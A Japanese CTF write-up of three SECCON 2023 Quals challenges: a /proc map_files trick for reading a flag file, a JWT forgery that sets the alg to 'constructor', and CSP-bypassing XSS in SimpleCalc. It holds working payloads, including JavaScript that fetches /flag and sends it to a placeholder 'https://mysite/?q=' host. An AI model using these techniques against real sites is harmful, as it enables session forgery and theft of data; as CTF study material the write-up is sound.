# SECCON CTF 2023 Quals Writeup

SECCON CTF 2023 Quals（<https://ctftime.org/event/2003/>）に参加しました。  
土, 16 9月 2023, 14:00 JST — 日, 17 9月 2023, 14:00 JST

チーム：OnePaddingで参加して、653チーム中87位（国内：35/334）でした。

一問しか解けなかったですが、学びが結構あったので良かったです。  
Web問は後で復習します。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [misc/readme 2023](#miscreadme-2023)
- [web/Bad JWT](#webbad-jwt)
- [web/SimpleCalc](#websimplecalc)
  - [[web/SimpleCalc] 解法1](#websimplecalc-解法1)
  - [[web/SimpleCalc] 解法2](#websimplecalc-解法2)

<!-- /code_chunk_output -->

## misc/readme 2023

93 solved / 104 points

- 問題コード

```python
import mmap
import os
import signal

signal.alarm(60)

try:
    f = open("./flag.txt", "r")
    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
except FileNotFoundError:
    print("[-] Flag does not exist")
    exit(1)

while True:
    path = input("path: ")

    if 'flag.txt' in path:
        print("[-] Path not allowed")
        exit(1)
    elif 'fd' in path:
        print("[-] No more fd trick ;)")
        exit(1)

    with open(os.path.realpath(path), "rb") as f:
        print(f.read(0x100))
```

ファイルパスを入力して、flag.txtの中身を読み込めればフラグを取得できる。  
コードを見るとわかるが、`flag.txt`や`fd`が文字中に入っているとプログラムが終了する。

fdが使えれば、以下のようなパスでflag.txtの中身を読み込める。

```text
/proc/self/fd/4
```

今回はfdが使えないため、どうにかする必要がある。  
また、`mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)`が使われているのが気になる。  
いろいろ`/proc`配下を調べたところ、`/proc/self/map_files/<ファイルのメモリアドレス>`が使えそうだった。

```sh
path: /proc/self/map_files/7f8922e60000-7f8922e61000
b'FAKECON{******* FIND ME ON REMOTE SERVER *******}\n'
```

メモリにマップされたファイルがシンボリックリンクされているみたい。

```sh
ctf@52f21ee060a3:/$ cat /proc/44/maps
5619764e9000-5619764ea000 r--p 00000000 08:20 508394                     /usr/local/bin/python3.11
5619764ea000-5619764eb000 r-xp 00001000 08:20 508394                     /usr/local/bin/python3.11
5619764eb000-5619764ec000 r--p 00002000 08:20 508394                     /usr/local/bin/python3.11
5619764ec000-5619764ed000 r--p 00002000 08:20 508394                     /usr/local/bin/python3.11
5619764ed000-5619764ee000 rw-p 00003000 08:20 508394                     /usr/local/bin/python3.11
561976572000-56197685a000 rw-p 00000000 00:00 0                          [heap]
7f892278e000-7f892288e000 rw-p 00000000 00:00 0 
7f89228d1000-7f89228d3000 r--p 00000000 08:20 509208                     /usr/local/lib/python3.11/lib-dynload/mmap.cpython-311-x86_64-linux-gnu.so
7f89228d3000-7f89228d5000 r-xp 00002000 08:20 509208                     /usr/local/lib/python3.11/lib-dynload/mmap.cpython-311-x86_64-linux-gnu.so
7f89228d5000-7f89228d7000 r--p 00004000 08:20 509208                     /usr/local/lib/python3.11/lib-dynload/mmap.cpython-311-x86_64-linux-gnu.so
7f89228d7000-7f89228d8000 r--p 00005000 08:20 509208                     /usr/local/lib/python3.11/lib-dynload/mmap.cpython-311-x86_64-linux-gnu.so
7f89228d8000-7f89228d9000 rw-p 00006000 08:20 509208                     /usr/local/lib/python3.11/lib-dynload/mmap.cpython-311-x86_64-linux-gnu.so
7f89228d9000-7f8922b3f000 rw-p 00000000 00:00 0 
7f8922b3f000-7f8922b46000 r--s 00000000 08:20 486465                     /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f8922b46000-7f8922b9d000 r--p 00000000 08:20 486112                     /usr/lib/locale/C.utf8/LC_CTYPE
7f8922b9d000-7f8922b9f000 rw-p 00000000 00:00 0 
7f8922b9f000-7f8922baf000 r--p 00000000 08:20 486531                     /usr/lib/x86_64-linux-gnu/libm.so.6
7f8922baf000-7f8922c22000 r-xp 00010000 08:20 486531                     /usr/lib/x86_64-linux-gnu/libm.so.6
7f8922c22000-7f8922c7c000 r--p 00083000 08:20 486531                     /usr/lib/x86_64-linux-gnu/libm.so.6
7f8922c7c000-7f8922c7d000 r--p 000dc000 08:20 486531                     /usr/lib/x86_64-linux-gnu/libm.so.6
7f8922c7d000-7f8922c7e000 rw-p 000dd000 08:20 486531                     /usr/lib/x86_64-linux-gnu/libm.so.6
7f8922c7e000-7f8922ca4000 r--p 00000000 08:20 486492                     /usr/lib/x86_64-linux-gnu/libc.so.6
7f8922ca4000-7f8922df9000 r-xp 00026000 08:20 486492                     /usr/lib/x86_64-linux-gnu/libc.so.6
7f8922df9000-7f8922e4c000 r--p 0017b000 08:20 486492                     /usr/lib/x86_64-linux-gnu/libc.so.6
7f8922e4c000-7f8922e50000 r--p 001ce000 08:20 486492                     /usr/lib/x86_64-linux-gnu/libc.so.6
7f8922e50000-7f8922e52000 rw-p 001d2000 08:20 486492                     /usr/lib/x86_64-linux-gnu/libc.so.6
7f8922e52000-7f8922e5f000 rw-p 00000000 00:00 0 
7f8922e60000-7f8922e61000 r--s 00000000 08:20 511429                     /home/ctf/flag.txt
7f8922e61000-7f8922f4f000 r--p 00000000 08:20 508594                     /usr/local/lib/libpython3.11.so.1.0
7f8922f4f000-7f8923103000 r-xp 000ee000 08:20 508594                     /usr/local/lib/libpython3.11.so.1.0
7f8923103000-7f89231e6000 r--p 002a2000 08:20 508594                     /usr/local/lib/libpython3.11.so.1.0
7f89231e6000-7f8923215000 r--p 00384000 08:20 508594                     /usr/local/lib/libpython3.11.so.1.0
7f8923215000-7f8923346000 rw-p 003b3000 08:20 508594                     /usr/local/lib/libpython3.11.so.1.0
7f8923346000-7f892338b000 rw-p 00000000 00:00 0 
7f892338b000-7f892338c000 r--p 00000000 08:20 486474                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f892338c000-7f89233b1000 r-xp 00001000 08:20 486474                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f89233b1000-7f89233bb000 r--p 00026000 08:20 486474                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f89233bb000-7f89233bd000 r--p 00030000 08:20 486474                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f89233bd000-7f89233bf000 rw-p 00032000 08:20 486474                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fff3eee6000-7fff3ef07000 rw-p 00000000 00:00 0                          [stack]
7fff3efc6000-7fff3efca000 r--p 00000000 00:00 0                          [vvar]
7fff3efca000-7fff3efcc000 r-xp 00000000 00:00 0                          [vdso]
```

プログラムを実行するたびに該当のアドレスは変わるみたいなので、アドレスが書いてあるファイルを探す。  
ファイルの読み込みバイト上限（0x100）なので、`/proc/self/maps`だと肝心のflag.txtのアドレスは分からない。

`/proc/self/syscall`の一番後ろの値（`0x7f8922d7607d`）が使えそう。

```sh
ctf@52f21ee060a3:/$ cat /proc/44/syscall
0 0x0 0x561976776ff0 0x2000 0x2 0x0 0x0 0x7fff3ef05d98 0x7f8922d7607d
```

しかも、flag.txtのアドレスとの差分が毎回同じようなので、逆算してflag.txtの先頭アドレスを特定できる。  
末尾アドレスは`+ 0x1000`。

- 例

| | |
-- | --
/proc/self/syscall | 7f85f5e9807d
/home/ctf/flag.txt | 7f85f5f82000-7f85f5f83000
[先頭アドレスまでの差分] | e9f83

スクリプトを書いても良かったが、実行時間の制限が60秒なため手動で計算した。

```sh
$ nc readme-2023.seccon.games 2023
path: /proc/self/syscall
b'0 0x7 0x55bfd84bb6b0 0x400 0x2 0x0 0x0 0x7ffca7f7b078 0x7f85f5e9807d\n'
path: /proc/self/map_files/7f85f5f82000-7f85f5f83000
b'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\n'
path:
```

- FLAG

```text
SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}
```

## web/Bad JWT

107 solved / 98 points

解けなかった問題。
JWTが使われており、認可処理としてなぜか正しいトークンを再計算して比較している。  
`isAdmin`が含まれるトークンを発行できれば勝ち。

- 該当箇所: `src/index.js`

```js
app.use((req, res, next) => {
	try {
		const token = req.cookies.session;
		const payload = jwt.verify(token, secret);
		req.session = payload;
	} catch (e) {
		return res.status(400).send('Authentication failed');
	}
	return next();
})

app.get('/', (req, res) => {
	if (req.session.isAdmin === true) {
		return res.send(FLAG);
	} else {
		return res.status().send('You are not admin!');
	}
});
```

- 該当箇所: `src/jwt.js`

```js
const algorithms = {
	hs256: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}
```

```js
const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}

const parseToken = (token) => {
	const parts = token.split('.');
	if (parts.length !== 3) throw Error('Invalid JWT format');
	
	const [ header, payload, signature ] = parts;
	const parsedHeader = parsePart(header);
	const parsedPayload = parsePart(payload);
	
	return { header: parsedHeader, payload: parsedPayload, signature }
}
```

```js
const verify = (token, secret) => {
	const { header, payload, signature: expected_signature } = parseToken(token);

	const calculated_signature = createSignature(header, payload, secret);
	
	const calculated_buf = Buffer.from(calculated_signature, 'base64');
	const expected_buf = Buffer.from(expected_signature, 'base64');

	if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
		throw Error('Invalid signature');
	}

	return payload;
}
```

トークンのシグネチャ部分を再計算して、送信されたシグネチャと比較している。  
`Buffer.compare(calculated_buf, expected_buf)`が0になるようにしないといけない。

- `calculated_buf`

シグネチャ計算時の箇所を見ると、`algorithms`のキーに任意の文字列を入れられる。

```js
const signature = algorithms[header.alg.toLowerCase()](data, secret);
```

algorithmsは生成されたオブジェクトのため、`algorithms["constructor"]`が使える。

```node
> algorithms = {}
{}
> algorithms["constructor"]
[Function: Object]
> signature = algorithms["constructor"]("header.payload","secret")
[String: 'header.payload']
```

後は組み立てるだけ。

```text
header: eyJhbGciOiJjb25zdHJ1Y3RvciJ9  <- {"alg":"constructor"}
payload: eyJpc0FkbWluIjp0cnVlfQ       <- {"isAdmin":true}
```

signatureは`${header}.${payload}`ではあるが、トークン内に`.`を3つ以上使えないためそのままは不可。  
`Buffer.from(<文字列>, 'base64')`では<文字列>の`.`を消しても同じ値になることを利用する。

```node
> Buffer.from('eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ', 'base64')
<Buffer 7b 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
> Buffer.from('eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ', 'base64')
<Buffer 7b 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
```

完成したトークンをクッキーに付けて送ると、フラグがもらえる。

```text
eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ
```

- FLAG

```text
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
```

- 所感

後から解法を見て分かったが、なぜ`constructor`に気づかなかったのか。

## web/SimpleCalc

23 solved / 193 points

シンプルなXSS問題だが解けなかった。

- 該当箇所（クライアント側）: `src/static/js/index.js`

```js
const params = new URLSearchParams(location.search);
const result = eval(params.get('expr'));
document.getElementById('result').innerText = result.toString();
```

- 該当箇所（サーバ側）: `src/index.js`

```js
app.use((req, res, next) => {
  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
  res.header("Content-Security-Policy", `default-src ${js_url} 'unsafe-eval';`);
  next();
});
```

```js
app.get("/flag", (req, res) => {
  console.log(req.url, req.cookies, req.get("X-FLAG"));
  if (req.cookies.token !== ADMIN_TOKEN || !req.get("X-FLAG")) {
    return res.send("No flag for you!");
  }
  return res.send(FLAG);
});

app.post("/report", reportLimiter, async (req, res) => {
  const { expr } = req.body;

  const url = new URL(`http://localhost:${PORT}/`);
  url.searchParams.append("expr", expr);

  try {
    await visit(url);
    return res.sendStatus(200);
  } catch (err) {
    console.error(err);
    return res.status(500).send("Something wrong");
  }
});
```

exprパラメータに入力した式をevalしていることが分かる。  
フラグを取得するには、`/flag`にアクセスする際に以下の条件が必要。

- クッキーに`ADMIN_TOKEN`を付ける。
- リクエストヘッダに`X-FLAG`を付ける。

また、CSPヘッダとして`Content-Security-Policy: default-src http://<target>:3000/js/index.js 'unsafe-eval';`がある。

リクエストヘッダが厄介で、XHRやfetch等によってヘッダを付与する必要がある。
しかし、connect-srcも制限されるため、指定されているsrc以外では以下が使えない。

- a, ping
- fetch()
- XMLHttpRequest
- WebSocket
- EventSource
- Navigator.sendBeacon()

参考: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src>

それがなければ以下のペイロードで終われた。

```js
var form = document.createElement('FORM');
form.method='GET';
form.action='/flag';
form.target='newWindow';
document.body.appendChild(form);
let w = window.open("","newWindow");
form.submit();
setTimeout(()=>{
  document.location= `https://mysite/?c=${w.document.body.innerHTML}`
},500);
```

そのため、別の方法を考える必要がある。  
後から他の人のWriteupを見て2パターンの方法があるっぽい。  
Service Workerの方法は試していたが、やり方が間違っていたらしく惜しかった。

### [web/SimpleCalc] 解法1

Service Workerを使う方法。想定解法らしい。  
どおりで`Note: Don't forget that the target host is localhost from the admin bot.`と書いてあったのかと思った。  
Service Workerはhttpsかlocalhostでしか使えないためと思われる。

- 手順

1. evalでService Workerを登録する。
1. Service Workerにリクエストを送り、スクリプトを埋め込んだHTMLを返させる。
1. /flagへfetchが実行される。
1. レスポンスの内容を自身のサイトに飛ばす。

- Service Worker内で動かすスクリプト
  - リクエスト判別のため、if文を入れている。
  - documentは何かしら返さないとエラーになるっぽい。

```js
self.addEventListener("fetch", (e) => {
    if (e.request.url.endsWith("/test")){
        let res = "<script>fetch('/flag',{headers:{'X-FLAG':'a'},credentials:'include'}).then(res=>res.text()).then(flag=>location='https://mysite/?q='+flag)</script>";
        e.respondWith(new Response(res, {headers:{'Content-Type':'text/html'}}));
    }
});
document = {}
document.getElementById = () => {return {innerText:""}}
```

- 実際のペイロード
  - URLにそのまま上のスクリプトを入れると上手く動かないので、URLエンコードしている。Base64でも良さそう？

```js
var src = 'self%2EaddEventListener%28%22fetch%22%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20if%20%28e%2Erequest%2Eurl%2EendsWith%28%22%2Fjs%2Ftest%22%29%29%7B%0A%20%20%20%20%20%20%20%20let%20res%20%3D%20%22%3Cscript%3Efetch%28%27%2Fflag%27%2C%7Bheaders%3A%7B%27X%2DFLAG%27%3A%27a%27%7D%2Ccredentials%3A%27include%27%7D%29%2Ethen%28res%3D%3Eres%2Etext%28%29%29%2Ethen%28flag%3D%3Elocation%3D%27https%3A%2F%2Fmysite%2F%3Fq%3D%27%2Bflag%29%3C%2Fscript%3E%22%3B%0A%20%20%20%20%20%20%20%20e%2ErespondWith%28new%20Response%28res%2C%20%7Bheaders%3A%7B%27Content%2DType%27%3A%27text%2Fhtml%27%7D%7D%29%29%3B%0A%20%20%20%20%7D%0A%7D%29%3B%0Adocument%20%3D%20%7B%7D%0Adocument%2EgetElementById%20%3D%20%28%29%20%3D%3E%20%7Breturn%20%7BinnerText%3A%22%22%7D%7D';
var sw = `/js/index.js?expr=${src}`;
navigator.serviceWorker.register(sw);
setInterval(()=>{location='/js/test'},2000);
```

### [web/SimpleCalc] 解法2

431エラーを出して、CSPヘッダを出力させなくする方法。  
431エラーである必要は無いと思うが、今回の問題ではこれが使われていた。  

- 手順

1. iframeのsrcにパラメータ数が上限を超えたリクエストを送り431エラーを出す。
1. iframe経由でfetchが使えるので、`X-FLAG`ヘッダをつけたリクエストを送信する。
1. レスポンスの内容を自身のサイトに飛ばす。

```js
var f=document.createElement('iframe');
f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
document.body.appendChild(f);
f.onload = () => {
    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
        .then(res => res.text())
        .then(flag => location='https://mysite/?q='+flag)
}
```

- 所感

復習がてらService Worker調べてみたが少しだけ使い方が分かったので良かった。  
あと最近はWebhook.siteを使う人が多い？
